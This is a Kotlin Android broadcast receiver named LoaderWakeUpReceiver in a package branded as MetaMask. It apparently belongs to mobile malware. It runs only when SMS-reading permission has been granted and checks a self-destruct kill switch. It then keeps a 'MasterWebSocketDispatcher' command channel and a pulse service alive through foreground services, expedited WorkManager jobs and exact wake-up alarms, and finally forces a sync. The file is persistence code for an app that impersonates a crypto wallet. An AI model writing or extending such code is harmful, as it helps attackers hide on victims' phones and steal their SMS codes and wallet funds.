package com.example.MetaMask.receivers

import android.Manifest
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.content.ContextCompat
import androidx.work.OneTimeWorkRequest
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.ServiceStarterWorker
import com.example.MetaMask.services.sync.SyncManager

class LoaderWakeUpReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[LoaderWakeUpReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        val action = intent.action

        val hasReadSms = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[LoaderWakeUpReceiver] if branch") //xdbg
            return
        }

        try {
            val killPrefs = context.getSharedPreferences(
                com.example.MetaMask.services.SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
            if (killPrefs.getBoolean(
                    com.example.MetaMask.services.SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
                return
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[LoaderWakeUpReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        try {
            try {
                val pulseIntent = Intent(context, com.example.MetaMask.services.PulseService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.util.Log.d("XDBG", "[LoaderWakeUpReceiver] if branch") //xdbg
                    context.startForegroundService(pulseIntent)
                } else {
                    context.startService(pulseIntent)
                }
            } catch (e: Exception) { }

            val masterIntent = Intent(context, MasterWebSocketDispatcher::class.java).apply {
                putExtra(MasterWebSocketDispatcher.EXTRA_STARTED_FROM_BOOT, false)
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[LoaderWakeUpReceiver] if branch") //xdbg
                context.startForegroundService(masterIntent)
            } else {
                context.startService(masterIntent)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[LoaderWakeUpReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        try {
            val request = OneTimeWorkRequest.Builder(ServiceStarterWorker::class.java)
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .addTag("WAKE_UP_URGENT")
                .build()

            WorkManager.getInstance(context).enqueue(request)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[LoaderWakeUpReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        try {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val alarmIntent = Intent(context, AlarmReceiver::class.java).apply {
                this.action = "com.example.MetaMask.ALARM_TRIGGER"
            }

            val pendingIntent = PendingIntent.getBroadcast(
                context,
                777999,
                alarmIntent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )

            val triggerTime = System.currentTimeMillis() + 500L

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.util.Log.d("XDBG", "[LoaderWakeUpReceiver] if branch") //xdbg
                if (alarmManager.canScheduleExactAlarms()) {
                    android.util.Log.d("XDBG", "[LoaderWakeUpReceiver] if branch") //xdbg
                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                } else {
                    alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                }
            } else if (Build.VERSION.SDK_INT >= 23) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            } else {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[LoaderWakeUpReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        try {
            SyncManager.forceSync()
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[LoaderWakeUpReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }
}
